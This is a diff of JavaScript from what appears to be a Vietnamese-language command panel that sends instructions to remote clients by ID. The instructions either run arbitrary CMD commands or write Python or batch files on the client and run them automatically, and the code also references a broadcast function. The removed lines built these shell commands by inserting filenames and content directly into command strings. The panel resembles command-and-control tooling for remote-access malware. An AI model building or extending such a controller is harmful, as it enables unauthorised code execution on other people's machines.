@@ -117,21 +117,34 @@
 
             if (!cid) return alert("Nhập Client ID!");
             
-            let cmd = "";
-            if (type === "exec") {
-                cmd = content;
-            } else if (type === "py") {
-                cmd = `python -c "open('${filename}', 'w', encoding='utf-8').write('''${content}''')" && python ${filename}`;
-            } else if (type === "bat") {
-                cmd = `echo ${content} > ${filename} && start ${filename}`;
+            // XỬ LÝ TẠO FILE AN TOÀN QUA API
+            if (type === "py" || type === "bat") {
+                if (!filename) return alert("Vui lòng nhập tên file!");
+                
+                await fetch('/api/command', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        action: 'create_file', 
+                        client_id: cid, 
+                        filename: filename, 
+                        content: content,
+                        run: true // Tự động chạy sau khi tạo
+                    })
+                });
+                log(`📤 Đã gửi lệnh tạo & chạy file ${filename} tới ${cid}`, "#ffc107");
+                return;
             }
 
-            await fetch('/api/command', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ action: 'exec', client_id: cid, command: cmd })
-            });
-            log(`📤 Đã gửi lệnh tới ${cid}`, "#ffc107");
+            // XỬ LÝ CHẠY LỆNH CMD THÔNG THƯỜNG
+            if (type === "exec") {
+                await fetch('/api/command', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ action: 'exec', client_id: cid, command: content })
+                });
+                log(`📤 Đã gửi lệnh CMD tới ${cid}`, "#ffc107");
+            }
         }
 
         async function sendBroadcast() {
